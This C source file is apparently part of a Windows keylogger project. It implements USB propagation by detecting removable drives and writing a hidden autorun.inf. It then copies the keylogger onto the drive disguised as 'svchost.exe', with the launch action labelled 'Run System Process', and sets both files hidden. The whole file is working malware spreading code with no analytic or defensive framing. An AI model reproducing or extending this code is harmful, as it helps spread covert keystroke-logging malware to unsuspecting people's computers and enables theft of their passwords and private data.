#include "usb_autorun.h"
#include "utils.h"
#include "file_hiding.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define MAX_DRIVES 26
#define AUTORUN_FILENAME "autorun.inf"
#define KEYLOGGER_DEPLOY_NAME "svchost.exe"

struct USBAutorun {
    char usb_drive[4];
    char keylogger_path[MAX_PATH];
};

USBAutorun* usb_autorun_create(void) {
    USBAutorun* autorun = safe_malloc(sizeof(USBAutorun));
    if (autorun) {
        memset(autorun->usb_drive, 0, sizeof(autorun->usb_drive));
        memset(autorun->keylogger_path, 0, sizeof(autorun->keylogger_path));
    }
    return autorun;
}

void usb_autorun_destroy(USBAutorun* autorun) {
    safe_free(autorun);
}

bool usb_autorun_setup(USBAutorun* autorun, const char* keylogger_path) {
    if (!autorun || !keylogger_path) return false;
    strncpy(autorun->keylogger_path, keylogger_path, MAX_PATH - 1);
    return true;
}

bool usb_autorun_detect_usb(USBAutorun* autorun) {
    if (!autorun) return false;

    char drives[MAX_DRIVES * 4 + 1] = {0};
    if (GetLogicalDriveStringsA(sizeof(drives), drives) == 0) {
        return false;
    }

    char* drive = drives;
    while (*drive) {
        if (GetDriveTypeA(drive) == DRIVE_REMOVABLE) {
            strncpy(autorun->usb_drive, drive, 3);
            autorun->usb_drive[3] = '\0';
            return true;
        }
        drive += 4;
    }

    return false;
}

static bool create_autorun_inf(const char* usb_drive) {
    char autorun_path[MAX_PATH];
    snprintf(autorun_path, sizeof(autorun_path), "%s%s", usb_drive, AUTORUN_FILENAME);

    FILE* file = fopen(autorun_path, "w");
    if (!file) return false;

    fprintf(file, "[autorun]\n");
    fprintf(file, "open=%s\n", KEYLOGGER_DEPLOY_NAME);
    fprintf(file, "action=Run System Process\n");

    fclose(file);

    return hide_file_attribute(autorun_path);
}

static bool copy_keylogger(USBAutorun* autorun) {
    char dest_path[MAX_PATH];
    snprintf(dest_path, sizeof(dest_path), "%s%s", autorun->usb_drive, KEYLOGGER_DEPLOY_NAME);

    if (!CopyFileA(autorun->keylogger_path, dest_path, FALSE)) {
        return false;
    }

    return hide_file_attribute(dest_path);
}

bool usb_autorun_deploy(USBAutorun* autorun) {
    if (!autorun || autorun->usb_drive[0] == '\0') return false;

    if (!create_autorun_inf(autorun->usb_drive)) {
        return false;
    }

    if (!copy_keylogger(autorun)) {
        return false;
    }

    return true;
}

const char* usb_autorun_get_usb_drive(USBAutorun* autorun) {
    if (!autorun) return NULL;
    return autorun->usb_drive;
}